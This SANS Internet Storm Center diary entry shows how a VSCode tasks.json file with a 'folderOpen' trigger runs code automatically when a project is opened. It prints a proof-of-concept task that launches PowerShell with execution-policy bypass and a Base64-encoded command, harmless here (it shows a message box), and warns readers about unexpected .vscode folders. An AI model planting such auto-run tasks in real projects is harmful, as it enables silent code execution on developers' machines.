---
title: Automatic Script Execution In Visual Studio Code, (Wed, Jan 21st)
url: https://isc.sans.edu/diary/rss/32644
source: SANS Internet Storm Center, InfoCON: green
date: 2026-01-21
fetch_date: 2026-01-22T03:36:23.695623
---

# Automatic Script Execution In Visual Studio Code, (Wed, Jan 21st)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Xavier Mertens](/handler_list.html#xavier-mertens "Xavier Mertens")

Threat Level: [green](/infocon.html)

* [previous](/diary/32640)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/amsterdam-march-2026/course/reverse-engineering-malware-advanced-code-analysis) | Amsterdam | Mar 16th - Mar 20th 2026 |

# [Automatic Script Execution In Visual Studio Code](/forums/diary/Automatic%2BScript%2BExecution%2BIn%2BVisual%2BStudio%2BCode/32644/)

**Published**: 2026-01-21. **Last Updated**: 2026-01-21 09:50:34 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Automatic%2BScript%2BExecution%2BIn%2BVisual%2BStudio%2BCode/32644/#comments)

Visual Studio Code is a popular open-source code editor[[1](https://code.visualstudio.com)]. But it’s much more than a simple editor, it’s a complete development platform that supports many languages and it is available on multiple platforms. Used by developers worldwide, it’s a juicy target for threat actors because it can be extended with extensions.

Of course, it became a new playground for bad guys and malicious extensions were already discovered multiple times, like the 'Dracula Official' theme[[2](https://www.bleepingcomputer.com/news/security/malicious-vscode-extensions-with-millions-of-installs-discovered/)]. Their modus-operandi is always the same: they take the legitimate extension and include scripts that perform malicious actions.

VSCode has also many features that help developers in their day to day job. One of them is the execution of automatic tasks on specific events. Think about the automatic macro execution in Microsoft Office.

With VSCode, it’s easy to implement and it’s based on a simple JSON file. Create in your project directory a sub-directory ".vscode" and, inside this one, create a “tasks.json”. Here is an example:

```

PS C:\temp\MyProject> cat .\.vscode\tasks.json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": “ISC PoC,
      "type": "shell",
      "command": "powershell",
      "args": [
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-EncodedCommand",
      "QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEYAcgBhAG0AZQB3AG8AcgBrADsAIABbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAE0AZQBzAHMAYQBnAGUAQgBvAHgAXQA6ADoAUwBoAG8AdwAoACcASQAgAGEAbQAgAG4AbwB0ACAAbQBhAGwAaQBjAGkAbwB1AHMAIQAgAH0AOgAtAD4AJwAsACAAJwBJAFMAQwAgAFAAbwBDACcAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwA"
      ],
      "problemMatcher": [],
      "runOptions": {
        "runOn": "folderOpen"
      },
    }
  ]
}
```

The key element in this JSON file is the "runOn" method: The script will be triggered when the folder will be opened by VSCode.

If you see some Base64 encode stuff, you can imagine that some obfuscation is in place. Now, launch VSCode from the project directory and you should see this:

![](https://isc.sans.edu/diaryimages/images/isc-20260121-1.png)

The Base64 data is just this code:

```

Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('I am not malicious! }:->', 'ISC PoC') | Out-Null
```

This technique has already been implemented by some threat actors![[3](https://redasgard.com/blog/hunting-lazarus-contagious-interview-c2-infrastructure)]!

Be careful if you see some unexpected ".vscode" directories!

[1] <https://code.visualstudio.com>
[2] <https://www.bleepingcomputer.com/news/security/malicious-vscode-extensions-with-millions-of-installs-discovered/>
[3] <https://redasgard.com/blog/hunting-lazarus-contagious-interview-c2-infrastructure>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Plugin](/tag.html?tag=Plugin) [Execution](/tag.html?tag=Execution) [Automatic](/tag.html?tag=Automatic) [Extension](/tag.html?tag=Extension) [Code](/tag.html?tag=Code) [VSCode](/tag.html?tag=VSCode)

[0 comment(s)](/diary/Automatic%2BScript%2BExecution%2BIn%2BVisual%2BStudio%2BCode/32644/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/amsterdam-march-2026/course/reverse-engineering-malware-advanced-code-analysis) | Amsterdam | Mar 16th - Mar 20th 2026 |

* [previous](/diary/32640)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2026 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)